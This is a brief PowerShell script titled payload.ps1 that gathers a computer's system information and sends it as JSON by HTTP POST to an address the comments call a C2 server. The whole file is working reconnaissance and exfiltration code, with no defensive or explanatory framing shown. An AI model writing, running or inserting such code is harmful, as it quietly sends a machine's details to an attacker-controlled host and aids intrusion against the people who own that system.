# payload.ps1

# Collect system information
$sysInfo = Get-ComputerInfo

# Send the collected information to the C2 server
$sysInfo | ConvertTo-Json | Invoke-WebRequest -Uri "http://10.100.102.60:8080/collect" -Method POST -ContentType "application/json"
